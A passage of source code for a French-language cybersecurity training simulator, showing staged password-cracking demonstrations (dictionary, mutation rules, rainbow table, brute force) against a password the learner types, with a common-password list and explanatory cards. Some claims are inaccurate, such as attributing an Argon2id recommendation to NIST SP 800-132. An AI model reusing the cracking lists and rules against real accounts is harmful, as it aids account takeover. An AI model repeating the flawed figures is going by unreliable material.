        'Cette simulation est terminée. Voici les **5 réflexes** qui auraient tout évité : vérifier l\'expéditeur par un autre canal · ne jamais ouvrir une pièce jointe inattendue · activer la MFA sur tous les comptes · maintenir des sauvegardes hors-ligne testées · former les équipes régulièrement.',
        '**Cadre réglementaire** : RGPD Art.33 (notification CNIL sous 72h) · NIS2 2024 (directive européenne, transposée en France, ~15 000 entités concernées) · LOPMI 2023 (assurance rançon) · Référentiel PSSI-E de l\'ANSSI.',
        'La **Cyber Kill Chain** (Lockheed Martin) modélise les 7 phases d\'une attaque : Reconnaissance → Weaponization → Delivery → Exploitation → Installation → C2 → Actions. Rompre une seule étape suffit à stopper l\'attaque.',
      ],
      knowledge: [
        { term: 'MFA — Multi-Factor Authentication', definition: 'Authentification par au moins deux facteurs (mot de passe + code app). Bloque 99,9% des attaques automatisées sur les comptes (Microsoft, 2023).', law: 'ANSSI recommande les apps TOTP (Google Authenticator, FreeOTP) plutôt que les SMS, vulnérables au SIM swapping.' },
        { term: 'NIS2 (2024)', definition: 'Directive européenne Network and Information Security 2, transposée en France fin 2024. Étend les obligations à ~15 000 entités. Notification d\'incident sous 24h, sous 72h pour rapport détaillé.', law: 'Entités "essentielles" et "importantes" : énergie, santé, transport, finance, eau, infrastructures numériques. Amendes : jusqu\'à 10M€ ou 2% CA mondial.' },
        { term: 'Cyber Kill Chain', definition: 'Modèle Lockheed Martin (2011) décrivant les 7 phases d\'une cyberattaque. Objectif défensif : identifier à quelle phase on peut rompre la chaîne pour stopper l\'attaque au plus tôt.', example: 'Stade idéal de rupture : phase 3 (Delivery) — bloquer le phishing avant exécution. C\'est là que la formation des utilisateurs est décisive.' },
        { term: 'No More Ransom', definition: 'Projet Europol + ANSSI + partenaires privés. Bibliothèque de 130+ outils de déchiffrement gratuits pour les ransomwares connus. 1,5 milliard € de rançons évitées depuis 2016.', law: 'nomoreransom.org — toujours vérifier ici avant toute décision de paiement.' },
      ],
      screen: ({ onAction, state }) => <BilanScreen onAction={onAction} state={state} good={goodChoices} />,
      correctAction: 'restart',
      correctFeedback: '',
    },
  ];
}

// ─── PASSWORD SCENARIO ─────────────────────────────────────────────────────────

function calcEntropy(pwd: string): number {
  let pool = 0;
  if (/[a-z]/.test(pwd)) pool += 26;
  if (/[A-Z]/.test(pwd)) pool += 26;
  if (/[0-9]/.test(pwd)) pool += 10;
  if (/[^a-zA-Z0-9]/.test(pwd)) pool += 32;
  return pool === 0 ? 0 : Math.log2(pool) * pwd.length;
}

function crackTime(entropy: number): string {
  const attempts = Math.pow(2, entropy);
  const perSec = 1e10;
  const secs = attempts / perSec;
  if (secs < 1) return 'Instantané';
  if (secs < 60) return `${secs.toFixed(1)} secondes`;
  if (secs < 3600) return `${(secs / 60).toFixed(1)} minutes`;
  if (secs < 86400) return `${(secs / 3600).toFixed(1)} heures`;
  if (secs < 31536000) return `${(secs / 86400).toFixed(0)} jours`;
  if (secs < 31536000 * 1000) return `${(secs / 31536000).toFixed(0)} ans`;
  return `${(secs / 31536000 / 1e6).toFixed(0)} millions d'années`;
}

async function sha256(str: string): Promise<string> {
  const buf = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(str));
  return Array.from(new Uint8Array(buf)).map(b => b.toString(16).padStart(2, '0')).join('');
}

const DICT_PASSWORDS = [
  '123456', 'password', 'azerty', 'qwerty', 'iloveyou', 'admin', 'letmein',
  'welcome', 'monkey', 'sunshine', 'princess', 'football', 'charlie', 'donald',
  'master', 'hello', 'shadow', 'abc123', 'pass123', '1234', '12345678',
  'superman', 'batman', 'dragon', '123123', '111111', 'Password1', 'P@ssword',
  'Summer2024', 'Juillet2024', 'motdepasse', 'soleil', 'bonjour', 'france',
  'paris2024', 'azerty123', 'marseille', 'liverpool', 'chelsea', 'juventus',
  'arsenal', '000000', 'pass1234', 'secret', 'test123', 'login', 'root',
  'toor', 'admin123', 'user', 'changeme',
];

type PwdPhase = 0 | 1 | 2 | 3 | 4 | 5;

interface PwdState {
  password: string;
  phase: PwdPhase;
  showPassword: boolean;
  dictLines: Array<{ word: string; found: boolean }>;
  dictDone: boolean;
  dictFound: boolean;
  dictFoundAt: number;
  mutLines: Array<{ word: string; found: boolean }>;
  mutDone: boolean;
  mutFound: boolean;
  hashMD5: string;
  hashSHA: string;
  rainbowFound: boolean;
  bruteCount: number;
  bruteDone: boolean;
  bruteFound: boolean;
  crackedAtPhase: number | null;
}

const initPwdState = (): PwdState => ({
  password: '',
  phase: 0,
  showPassword: false,
  dictLines: [],
  dictDone: false,
  dictFound: false,
  dictFoundAt: 0,
  mutLines: [],
  mutDone: false,
  mutFound: false,
  hashMD5: '',
  hashSHA: '',
  rainbowFound: false,
  bruteCount: 0,
  bruteDone: false,
  bruteFound: false,
  crackedAtPhase: null,
});

// Minimal MD5 implementation
function md5(inputStr: string): string {
  function safeAdd(x: number, y: number) { const lsw = (x & 0xFFFF) + (y & 0xFFFF); const msw = (x >> 16) + (y >> 16) + (lsw >> 16); return (msw << 16) | (lsw & 0xFFFF); }
  function bitRotateLeft(num: number, cnt: number) { return (num << cnt) | (num >>> (32 - cnt)); }
  function md5cmn(q: number, a: number, b: number, x: number, s: number, t: number) { return safeAdd(bitRotateLeft(safeAdd(safeAdd(a, q), safeAdd(x, t)), s), b); }
  function md5ff(a: number, b: number, c: number, d: number, x: number, s: number, t: number) { return md5cmn((b & c) | (~b & d), a, b, x, s, t); }
  function md5gg(a: number, b: number, c: number, d: number, x: number, s: number, t: number) { return md5cmn((b & d) | (c & ~d), a, b, x, s, t); }
  function md5hh(a: number, b: number, c: number, d: number, x: number, s: number, t: number) { return md5cmn(b ^ c ^ d, a, b, x, s, t); }
  function md5ii(a: number, b: number, c: number, d: number, x: number, s: number, t: number) { return md5cmn(c ^ (b | ~d), a, b, x, s, t); }
  function cipherBlock(M: number[]) {
    const [a0, b0, c0, d0] = [1732584193, -271733879, -1732584194, 271733878];
    let [a, b, c, d] = [a0, b0, c0, d0];
    a = md5ff(a, b, c, d, M[0], 7, -680876936); d = md5ff(d, a, b, c, M[1], 12, -389564586); c = md5ff(c, d, a, b, M[2], 17, 606105819); b = md5ff(b, c, d, a, M[3], 22, -1044525330);
    a = md5ff(a, b, c, d, M[4], 7, -176418897); d = md5ff(d, a, b, c, M[5], 12, 1200080426); c = md5ff(c, d, a, b, M[6], 17, -1473231341); b = md5ff(b, c, d, a, M[7], 22, -45705983);
    a = md5ff(a, b, c, d, M[8], 7, 1770035416); d = md5ff(d, a, b, c, M[9], 12, -1958414417); c = md5ff(c, d, a, b, M[10], 17, -42063); b = md5ff(b, c, d, a, M[11], 22, -1990404162);
    a = md5ff(a, b, c, d, M[12], 7, 1804603682); d = md5ff(d, a, b, c, M[13], 12, -40341101); c = md5ff(c, d, a, b, M[14], 17, -1502002290); b = md5ff(b, c, d, a, M[15], 22, 1236535329);
    a = md5gg(a, b, c, d, M[1], 5, -165796510); d = md5gg(d, a, b, c, M[6], 9, -1069501632); c = md5gg(c, d, a, b, M[11], 14, 643717713); b = md5gg(b, c, d, a, M[0], 20, -373897302);
    a = md5gg(a, b, c, d, M[5], 5, -701558691); d = md5gg(d, a, b, c, M[10], 9, 38016083); c = md5gg(c, d, a, b, M[15], 14, -660478335); b = md5gg(b, c, d, a, M[4], 20, -405537848);
    a = md5gg(a, b, c, d, M[9], 5, 568446438); d = md5gg(d, a, b, c, M[14], 9, -1019803690); c = md5gg(c, d, a, b, M[3], 14, -187363961); b = md5gg(b, c, d, a, M[8], 20, 1163531501);
    a = md5gg(a, b, c, d, M[13], 5, -1444681467); d = md5gg(d, a, b, c, M[2], 9, -51403784); c = md5gg(c, d, a, b, M[7], 14, 1735328473); b = md5gg(b, c, d, a, M[12], 20, -1926607734);
    a = md5hh(a, b, c, d, M[5], 4, -378558); d = md5hh(d, a, b, c, M[8], 11, -2022574463); c = md5hh(c, d, a, b, M[11], 16, 1839030562); b = md5hh(b, c, d, a, M[14], 23, -35309556);
    a = md5hh(a, b, c, d, M[1], 4, -1530992060); d = md5hh(d, a, b, c, M[4], 11, 1272893353); c = md5hh(c, d, a, b, M[7], 16, -155497632); b = md5hh(b, c, d, a, M[10], 23, -1094730640);
    a = md5hh(a, b, c, d, M[13], 4, 681279174); d = md5hh(d, a, b, c, M[0], 11, -358537222); c = md5hh(c, d, a, b, M[3], 16, -722521979); b = md5hh(b, c, d, a, M[6], 23, 76029189);
    a = md5hh(a, b, c, d, M[9], 4, -640364487); d = md5hh(d, a, b, c, M[12], 11, -421815835); c = md5hh(c, d, a, b, M[15], 16, 530742520); b = md5hh(b, c, d, a, M[2], 23, -995338651);
    a = md5ii(a, b, c, d, M[0], 6, -198630844); d = md5ii(d, a, b, c, M[7], 10, 1126891415); c = md5ii(c, d, a, b, M[14], 15, -1416354905); b = md5ii(b, c, d, a, M[5], 21, -57434055);
    a = md5ii(a, b, c, d, M[12], 6, 1700485571); d = md5ii(d, a, b, c, M[3], 10, -1894986606); c = md5ii(c, d, a, b, M[10], 15, -1051523); b = md5ii(b, c, d, a, M[1], 21, -2054922799);
    a = md5ii(a, b, c, d, M[8], 6, 1873313359); d = md5ii(d, a, b, c, M[15], 10, -30611744); c = md5ii(c, d, a, b, M[6], 15, -1560198380); b = md5ii(b, c, d, a, M[13], 21, 1309151649);
    a = md5ii(a, b, c, d, M[4], 6, -145523070); d = md5ii(d, a, b, c, M[11], 10, -1120210379); c = md5ii(c, d, a, b, M[2], 15, 718787259); b = md5ii(b, c, d, a, M[9], 21, -343485551);
    return [safeAdd(a, a0), safeAdd(b, b0), safeAdd(c, c0), safeAdd(d, d0)];
  }
  const str8 = unescape(encodeURIComponent(inputStr));
  const bytes = Array.from(str8).map(c => c.charCodeAt(0));
  bytes.push(0x80);
  while (bytes.length % 64 !== 56) bytes.push(0);
  const bitLen = (inputStr.length * 8);
  bytes.push(bitLen & 0xff, (bitLen >> 8) & 0xff, (bitLen >> 16) & 0xff, (bitLen >> 24) & 0xff, 0, 0, 0, 0);
  const M: number[] = [];
  for (let i = 0; i < bytes.length; i += 4) M.push(bytes[i] | (bytes[i + 1] << 8) | (bytes[i + 2] << 16) | (bytes[i + 3] << 24));
  let [a, b, c, d] = [1732584193, -271733879, -1732584194, 271733878];
  for (let i = 0; i < M.length; i += 16) {
    const block = cipherBlock(M.slice(i, i + 16));
    [a, b, c, d] = [a + block[0] | 0, b + block[1] | 0, c + block[2] | 0, d + block[3] | 0];
  }
  return [a, b, c, d].map(n => {
    const hex = (n >>> 0).toString(16).padStart(8, '0');
    return hex.match(/../g)!.map(h => h.split('').reverse().join('')).join('');
  }).join('');
}

function getMutations(pwd: string): string[] {
  const base = pwd.toLowerCase();
  const mutations: string[] = [];
  const leet = base.replace(/a/g, '@').replace(/e/g, '3').replace(/i/g, '1').replace(/o/g, '0').replace(/s/g, '$');
  const cap = base.charAt(0).toUpperCase() + base.slice(1);
  mutations.push(leet, cap, base + '123', base + '2024', base + '!', base + '@', cap + '1', cap + '123', cap + '2024', cap + '!', leet + '1', leet + '!');
  const baseWords = ['password', 'motdepasse', 'soleil', 'bonjour', 'france', 'admin', 'welcome', 'secret'];
  baseWords.forEach(w => {
    mutations.push(w + '123', w + '2024', w.charAt(0).toUpperCase() + w.slice(1) + '1', w.replace(/a/g, '@').replace(/e/g, '3'));
  });
  return [...new Set(mutations)];
}

function getStrengthLabel(entropy: number): { label: string; color: string } {
  if (entropy < 25) return { label: 'TRÈS FAIBLE', color: T.red };
  if (entropy < 40) return { label: 'FAIBLE', color: '#f97316' };
  if (entropy < 55) return { label: 'MOYEN', color: T.amber };
  if (entropy < 70) return { label: 'FORT', color: '#84cc16' };
  return { label: 'TRÈS FORT', color: T.green };
}

// ─── Password Scenario Component ───────────────────────────────────────────────

function PasswordScenario() {
  const [st, setSt] = useState<PwdState>(initPwdState());
  const dictTimerRef = useRef<ReturnType<typeof setInterval> | null>(null);
  const mutTimerRef = useRef<ReturnType<typeof setInterval> | null>(null);
  const bruteTimerRef = useRef<ReturnType<typeof setInterval> | null>(null);
  const dictIdxRef = useRef(0);
  const mutIdxRef = useRef(0);

  const entropy = calcEntropy(st.password);
  const strength = getStrengthLabel(entropy);
  const timeEst = st.password.length > 0 ? crackTime(entropy) : '—';

  const clearAllTimers = () => {
    if (dictTimerRef.current) clearInterval(dictTimerRef.current);
    if (mutTimerRef.current) clearInterval(mutTimerRef.current);
    if (bruteTimerRef.current) clearInterval(bruteTimerRef.current);
  };

  const resetAll = () => {
    clearAllTimers();
    dictIdxRef.current = 0;
    mutIdxRef.current = 0;
    setSt(initPwdState());
  };

  // Phase 1: dictionary attack
  const startPhase1 = useCallback((pwd: string) => {
    setSt(prev => ({ ...prev, phase: 1, dictLines: [], dictDone: false, dictFound: false }));
    dictIdxRef.current = 0;
    dictTimerRef.current = setInterval(() => {
      const idx = dictIdxRef.current;
      if (idx >= DICT_PASSWORDS.length) {
        clearInterval(dictTimerRef.current!);
        setSt(prev => ({ ...prev, dictDone: true }));
        setTimeout(() => startPhase2(pwd), 800);
        return;
      }
      const word = DICT_PASSWORDS[idx];
      const found = word.toLowerCase() === pwd.toLowerCase();
      dictIdxRef.current = idx + 1;
      setSt(prev => ({
        ...prev,
        dictLines: [...prev.dictLines.slice(-18), { word, found }],
        ...(found ? { dictFound: true, dictDone: true, dictFoundAt: idx + 1, crackedAtPhase: 1 } : {}),
      }));
      if (found) {
        clearInterval(dictTimerRef.current!);
        setSt(prev => ({ ...prev, phase: 5 }));
      }
    }, 80);
  }, []);

  // Phase 2: rule mutations
  const startPhase2 = useCallback((pwd: string) => {
    const mutations = getMutations(pwd);
    setSt(prev => ({ ...prev, phase: 2, mutLines: [], mutDone: false, mutFound: false }));
    mutIdxRef.current = 0;
    mutTimerRef.current = setInterval(() => {
      const idx = mutIdxRef.current;
      if (idx >= mutations.length) {
        clearInterval(mutTimerRef.current!);
        setSt(prev => ({ ...prev, mutDone: true }));
        setTimeout(() => startPhase3(pwd), 800);
        return;
      }
      const word = mutations[idx];
      const found = word === pwd;
      mutIdxRef.current = idx + 1;
      setSt(prev => ({
        ...prev,
        mutLines: [...prev.mutLines.slice(-18), { word, found }],
        ...(found ? { mutFound: true, mutDone: true, crackedAtPhase: 2 } : {}),
      }));
      if (found) {
        clearInterval(mutTimerRef.current!);
        setSt(prev => ({ ...prev, phase: 5 }));
      }
    }, 120);
  }, []);

  // Phase 3: rainbow table
  const startPhase3 = useCallback(async (pwd: string) => {
    setSt(prev => ({ ...prev, phase: 3 }));
    const m = md5(pwd);
    const s = await sha256(pwd);
    const rainbowFound = pwd.length <= 8 && entropy < 45;
    setSt(prev => ({ ...prev, hashMD5: m, hashSHA: s, rainbowFound, ...(rainbowFound ? { crackedAtPhase: 3 } : {}) }));
    setTimeout(() => {
      if (rainbowFound) {
        setSt(prev => ({ ...prev, phase: 5 }));
      } else {
        startPhase4(pwd);
      }
    }, 3000);
  }, [entropy]);

  // Phase 4: brute force
  const startPhase4 = useCallback((pwd: string) => {
    setSt(prev => ({ ...prev, phase: 4, bruteCount: 0, bruteDone: false, bruteFound: false }));
    const weakPwd = calcEntropy(pwd) < 30;
    let count = 0;
    bruteTimerRef.current = setInterval(() => {
      count += Math.floor(Math.random() * 800000) + 400000;
      const pct = Math.min(count / 1e10, 0.05);
      setSt(prev => ({ ...prev, bruteCount: count }));
      if (pct >= 0.05) {
        clearInterval(bruteTimerRef.current!);
        setSt(prev => ({
          ...prev,
          bruteDone: true,
          bruteFound: weakPwd,
          ...(weakPwd ? { crackedAtPhase: 4 } : {}),
          phase: 5,
        }));
      }
    }, 150);
  }, []);

  const launchAnalysis = () => {
    if (!st.password) return;
    clearAllTimers();
    startPhase1(st.password);
  };

  useEffect(() => { return clearAllTimers; }, []);

  // Derived
  const hasMaj = /[A-Z]/.test(st.password);
  const hasMin = /[a-z]/.test(st.password);
  const hasNum = /[0-9]/.test(st.password);
  const hasSym = /[^a-zA-Z0-9]/.test(st.password);
  const barPct = Math.min((entropy / 80) * 100, 100);

  // Phase labels for narration
  const phaseNarration: Record<number, { title: string; chapter: string; story: string[]; knowledge: KnowledgeCard[] }> = {
    0: {
      chapter: 'PHASE 0 / 4',
      title: 'Analysez votre mot de passe',
      story: [
        'Entrez un mot de passe pour voir comment un attaquant l\'analyserait. L\'entropie mesure le nombre de bits d\'information : plus elle est haute, plus le mot de passe est difficile à deviner.',
        'Un GPU moderne peut tester **10 milliards de combinaisons par seconde**. La complexité perçue par l\'humain et la résistance réelle aux attaques sont souvent très différentes.',
        'Cliquez sur "LANCER L\'ANALYSE" pour simuler une attaque réelle en 4 phases.',
      ],
      knowledge: [
        { term: "Qu'est-ce que l'entropie ?", definition: "L'entropie d'un mot de passe mesure son imprévisibilité en bits. Elle dépend de la taille de l'alphabet utilisé et de la longueur. Formule : log2(taille_alphabet) × longueur.", example: '"password" : 6,5 bits. "P@ssw0rd!" : 52 bits. "MonChienMaxAdore2024!" : 98 bits.' },
        { term: 'Les 200 mots de passe les plus courants', definition: 'Des milliards de comptes sont compromis chaque année car les utilisateurs choisissent des mots de passe prévisibles. La liste RockYou.txt contient 14 millions de mots de passe réels volés.', law: 'Have I Been Pwned (haveibeenpwned.com) permet de vérifier si votre email a été exposé dans une fuite de données.' },
      ],
    },
    1: {
      chapter: 'PHASE 1 / 4',
      title: 'Attaque par dictionnaire',
      story: [
        'La première technique : tester des **millions de mots de passe courants** avant même d\'essayer le brute force. La liste RockYou.txt contient 14 344 391 mots de passe réels volés lors de la fuite de 2009.',
        'Si votre mot de passe est dans ce dictionnaire, il sera cassé en **moins de 1 seconde**, peu importe sa longueur apparente.',
        'Les attaquants utilisent aussi des listes spécialisées : mots de passe français, dates, prénoms, noms de villes...',
      ],
      knowledge: [
        { term: 'RockYou.txt', definition: 'Fichier issu de la fuite de données RockYou.com en 2009. 32 millions de comptes exposés, 14 millions de mots de passe uniques. Devenu le standard des attaques dictionnaire.', example: 'Les 5 plus courants : 123456, 12345, 123456789, password, iloveyou — représentent des millions de comptes.' },
        { term: 'Have I Been Pwned', definition: 'Service gratuit de Troy Hunt listant 12+ milliards de comptes compromis. Permet de vérifier si votre email ou mot de passe a été exposé dans une fuite connue.', law: 'haveibeenpwned.com — à consulter régulièrement. API disponible pour les développeurs.' },
      ],
    },
    2: {
      chapter: 'PHASE 2 / 4',
      title: 'Attaque par règles (mutations)',
      story: [
        'Les utilisateurs pensent souvent créer un mot de passe fort en substituant des lettres : "a→@", "e→3", "o→0". Mais ces règles sont **connues des attaquants** et codées dans leurs outils.',
        '**Hashcat** est l\'outil standard : il applique automatiquement des centaines de règles de transformation sur chaque mot du dictionnaire. "motdepasse" → "M0td3p@ss3!" est testé en millisecondes.',
        'L\'ajout de chiffres à la fin (123, 2024) est aussi systématiquement testé.',
      ],
      knowledge: [
        { term: 'Hashcat et les règles de mutation', definition: 'Hashcat est l\'outil open-source de référence pour le crack de hash. Il supporte 300+ GPU en parallèle et applique des règles complexes : leetspeak, majuscules, suffixes, préfixes, combinaisons.', example: 'Record mondial (2024) : 300 milliards de hash MD5 par seconde avec 8 RTX 4090 en cluster.' },
        { term: 'Leetspeak et ses limites', definition: 'Substitution de lettres par des chiffres/symboles visuellement similaires. Augmente marginalement la complexité mais toutes les substitutions communes sont dans les dictionnaires d\'attaquants.', law: 'Solution efficace : utiliser une passphrase longue plutôt que des substitutions. "MonChienS\'appelleMax" résiste infiniment mieux que "P@ssw0rd".' },
      ],
    },
    3: {
      chapter: 'PHASE 3 / 4',
      title: 'Rainbow Table & hashing',
      story: [
        'Les mots de passe sont stockés sous forme de **hash** — une empreinte cryptographique à sens unique. MD5 et SHA-1 sont obsolètes : leurs hash sont précalculés dans des rainbow tables.',
        'Une rainbow table contient des milliards de paires (mot de passe → hash). Si votre hash est dans la table, le mot de passe est trouvé **instantanément**, sans calcul.',
        'Les algorithmes modernes (bcrypt, Argon2, scrypt) intègrent un **sel** aléatoire qui rend les rainbow tables inutiles et ralentit artificiellement le calcul.',
      ],
      knowledge: [
        { term: 'Hash cryptographique', definition: 'Fonction à sens unique : facile à calculer dans un sens, impossible à inverser. SHA-256 produit toujours un hash de 256 bits. Moindre modification → hash totalement différent.', example: '"password" → SHA-256 : 5e884898da... | "Password" → SHA-256 : 8be04a17... (totalement différent).' },
        { term: 'Rainbow Table', definition: 'Table précalculée de milliards de paires (mot de passe → hash). Permet de retrouver un mot de passe depuis son hash en quelques secondes. Inefficace si salage utilisé.', law: 'MD5 et SHA-1 sont interdits pour stocker des mots de passe (ANSSI, NIST). Utiliser bcrypt, Argon2 ou scrypt.' },
        { term: 'Salage (salting)', definition: 'Ajout d\'une valeur aléatoire unique par utilisateur avant le hachage. Rend chaque hash unique même pour des mots de passe identiques, neutralise les rainbow tables.', law: 'bcrypt intègre automatiquement un sel de 128 bits. Argon2 (vainqueur du Password Hashing Competition 2015) est la recommandation actuelle.' },
      ],
    },
    4: {
      chapter: 'PHASE 4 / 4',
      title: 'Attaque brute force',
      story: [
        'En dernier recours : tester **toutes les combinaisons possibles**. Un GPU RTX 4090 peut tester 10 milliards de hash MD5 par seconde.',
        'La résistance dépend entièrement de l\'entropie du mot de passe. À partir de **60 bits d\'entropie**, même un cluster GPU ne peut pas craquer en temps raisonnable.',
        'C\'est pourquoi la **longueur** prime sur la complexité : une phrase de 4 mots aléatoires (diceware) est plus sûre et plus mémorisable qu\'un mot de passe court "complexe".',
      ],
      knowledge: [
        { term: 'Brute Force et GPU', definition: 'Les GPU sont 100× plus rapides que les CPU pour les calculs de hash. Un cluster de 8 RTX 4090 atteint 300 Ghash/s sur MD5. Les mots de passe < 8 caractères tombent en minutes.', example: 'Mot de passe 6 chars alphanumérique : cracké en 2 minutes. 10 chars : 10 ans. 15 chars : des millions d\'années.' },
        { term: 'bcrypt / Argon2', definition: 'Algorithmes de hachage conçus pour les mots de passe. Intentionnellement lents (paramètre de coût). bcrypt : 100ms par vérification. Argon2 : paramétrable en temps et mémoire.', law: 'NIST SP 800-132 recommande Argon2id. Django, Laravel, Spring utilisent bcrypt par défaut. Ne jamais utiliser MD5/SHA-1/SHA-256 sans sel et itérations pour les mots de passe.' },
      ],
    },
    5: {
      chapter: 'RÉSULTAT',
      title: 'Analyse terminée',
      story: [],
      knowledge: [],
    },
  };

  const currentNarration = phaseNarration[Math.min(st.phase, 5)];

  return (
    <div style={{ flex: 1, display: 'grid', gridTemplateColumns: '1fr 400px', overflow: 'hidden' }}>
      {/* LEFT */}
      <div style={{ borderRight: `1px solid ${T.line}`, display: 'flex', flexDirection: 'column', overflow: 'hidden', background: T.dark }}>
        <AnimatePresence mode="wait">

          {/* PHASE 0 — Input */}
          {st.phase === 0 && (
            <motion.div key="phase0" initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }} style={{ flex: 1, display: 'flex', flexDirection: 'column', padding: 28, overflowY: 'auto' }}>
              <div style={{ fontFamily: T.MONO, fontSize: 10, color: T.muted, marginBottom: 20, textTransform: 'uppercase', letterSpacing: '0.1em' }}>
                Simulateur — Entrez votre mot de passe
              </div>

              {/* Input field */}
              <div style={{ position: 'relative', marginBottom: 24 }}>
                <input
                  type={st.showPassword ? 'text' : 'password'}
                  value={st.password}
                  onChange={e => setSt(prev => ({ ...prev, password: e.target.value }))}
                  placeholder="Tapez un mot de passe..."
                  style={{
                    width: '100%', padding: '14px 44px 14px 16px',
                    background: '#161b22', border: `1px solid ${T.blue}`,
                    color: '#e6edf3', fontFamily: T.MONO, fontSize: 16,
                    outline: 'none', boxSizing: 'border-box',
                  }}
                />
                <button
                  onClick={() => setSt(prev => ({ ...prev, showPassword: !prev.showPassword }))}
                  style={{ position: 'absolute', right: 12, top: '50%', transform: 'translateY(-50%)', background: 'none', border: 'none', cursor: 'pointer', color: T.muted, padding: 0, display: 'flex', alignItems: 'center' }}
                >
                  {st.showPassword ? <EyeOff size={16} /> : <Eye size={16} />}
                </button>
              </div>

              {/* Real-time analysis */}
              {st.password.length > 0 && (
                <motion.div initial={{ opacity: 0, y: 8 }} animate={{ opacity: 1, y: 0 }} style={{ display: 'flex', flexDirection: 'column', gap: 12 }}>
                  {/* Checks */}
                  <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 8 }}>
                    {[
                      { label: `Longueur : ${st.password.length} car.`, ok: st.password.length >= 12 },
                      { label: 'Majuscules', ok: hasMaj },
                      { label: 'Minuscules', ok: hasMin },
                      { label: 'Chiffres', ok: hasNum },
                      { label: 'Symboles', ok: hasSym },
                      { label: 'Longueur ≥ 16', ok: st.password.length >= 16 },
                    ].map((item, i) => (
                      <div key={i} style={{ display: 'flex', alignItems: 'center', gap: 7, fontFamily: T.MONO, fontSize: 10, color: item.ok ? T.green : T.muted }}>
                        {item.ok ? <CheckCircle size={11} color={T.green} /> : <XCircle size={11} color={T.red} />}
                        {item.label}
                      </div>
                    ))}
                  </div>

                  {/* Entropy + strength */}
                  <div style={{ background: '#161b22', border: `1px solid #30363d`, padding: 14 }}>
                    <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: 8 }}>
                      <span style={{ fontFamily: T.MONO, fontSize: 10, color: T.muted }}>Entropie</span>
                      <span style={{ fontFamily: T.MONO, fontSize: 10, color: '#e6edf3', fontWeight: 700 }}>{entropy.toFixed(1)} bits</span>
                    </div>
                    <div style={{ height: 4, background: '#30363d', marginBottom: 8 }}>
                      <motion.div animate={{ width: `${barPct}%` }} style={{ height: '100%', background: strength.color, transition: 'width 0.3s' }} />
                    </div>
                    <div style={{ display: 'flex', justifyContent: 'space-between' }}>
                      <span style={{ fontFamily: T.MONO, fontSize: 11, fontWeight: 700, color: strength.color }}>{strength.label}</span>
                      <span style={{ fontFamily: T.MONO, fontSize: 9, color: T.muted }}>GPU brute force : {timeEst}</span>
                    </div>
                  </div>

                  {/* Launch button */}
                  <motion.button
                    whileHover={{ scale: 1.01 }}
                    onClick={launchAnalysis}
                    style={{ padding: '13px 0', background: T.blue, color: '#fff', border: 'none', cursor: 'pointer', fontFamily: T.MONO, fontSize: 12, fontWeight: 700, letterSpacing: '0.05em', marginTop: 4 }}
                  >
                    ▶ LANCER L'ANALYSE
                  </motion.button>
                </motion.div>
              )}

              {st.password.length === 0 && (
                <div style={{ color: T.muted, fontFamily: T.MONO, fontSize: 11, textAlign: 'center', marginTop: 40 }}>
                  ↑ Commencez à taper pour voir l'analyse en temps réel
                </div>
              )}
            </motion.div>
          )}

          {/* PHASE 1 — Dictionary */}
          {st.phase === 1 && (
            <motion.div key="phase1" initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }} style={{ flex: 1, display: 'flex', flexDirection: 'column', padding: 20, overflow: 'hidden' }}>
              <div style={{ fontFamily: T.MONO, fontSize: 10, color: T.amber, marginBottom: 12, textTransform: 'uppercase' }}>
                [PHASE 1] Attaque dictionnaire — RockYou.txt (14 344 391 mots)
              </div>
              <div style={{ flex: 1, overflowY: 'auto', fontFamily: T.MONO, fontSize: 11 }}>
                {st.dictLines.map((line, i) => (
                  <div key={i} style={{ color: line.found ? T.red : '#6e7681', marginBottom: 3, display: 'flex', gap: 10 }}>
                    <span style={{ color: '#30363d', minWidth: 30, textAlign: 'right' }}>{DICT_PASSWORDS.indexOf(line.word) + 1}</span>
                    <span style={{ color: line.found ? T.red : '#8b949e' }}>{line.word}</span>
                    {line.found && <span style={{ color: T.red, fontWeight: 700 }}>← TROUVÉ !</span>}
                  </div>
                ))}
                {st.dictDone && !st.dictFound && (
                  <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} style={{ marginTop: 12, color: T.green, fontFamily: T.MONO, fontSize: 10 }}>
                    ✓ Non trouvé dans le dictionnaire (14 344 391 mots testés) — passage phase 2...
                  </motion.div>
                )}
                {st.dictFound && (
                  <motion.div animate={{ opacity: [1, 0.3, 1] }} transition={{ repeat: Infinity, duration: 0.5 }}
                    style={{ marginTop: 12, color: T.red, fontFamily: T.MONO, fontSize: 12, fontWeight: 700 }}>
                    ⚠ MOT DE PASSE TROUVÉ en {st.dictFoundAt} tentative(s) !
                  </motion.div>
                )}
              </div>
            </motion.div>
          )}

          {/* PHASE 2 — Mutations */}
          {st.phase === 2 && (
            <motion.div key="phase2" initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }} style={{ flex: 1, display: 'flex', flexDirection: 'column', padding: 20, overflow: 'hidden' }}>
              <div style={{ fontFamily: T.MONO, fontSize: 10, color: T.amber, marginBottom: 12, textTransform: 'uppercase' }}>
                [PHASE 2] Attaque par règles — Hashcat mutations
              </div>
              <div style={{ flex: 1, overflowY: 'auto', fontFamily: T.MONO, fontSize: 11 }}>
                {st.mutLines.map((line, i) => (
                  <div key={i} style={{ color: line.found ? T.red : '#6e7681', marginBottom: 3, display: 'flex', gap: 10 }}>
                    <span style={{ color: '#30363d', minWidth: 22 }}>{i + 1}</span>
                    <span style={{ color: line.found ? T.red : '#8b949e' }}>{line.word}</span>
                    {line.found && <span style={{ color: T.red, fontWeight: 700 }}>← MUTATION TROUVÉE !</span>}
                  </div>
                ))}
                {st.mutDone && !st.mutFound && (
                  <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} style={{ marginTop: 12, color: T.green, fontFamily: T.MONO, fontSize: 10 }}>
                    ✓ Aucune mutation connue ne correspond — passage phase 3...
                  </motion.div>
                )}
                {st.mutFound && (
                  <motion.div animate={{ opacity: [1, 0.3, 1] }} transition={{ repeat: Infinity, duration: 0.5 }}
                    style={{ marginTop: 12, color: T.red, fontFamily: T.MONO, fontSize: 12, fontWeight: 700 }}>
                    ⚠ MUTATION TROUVÉE !
                  </motion.div>
                )}
              </div>
            </motion.div>
          )}

          {/* PHASE 3 — Rainbow */}
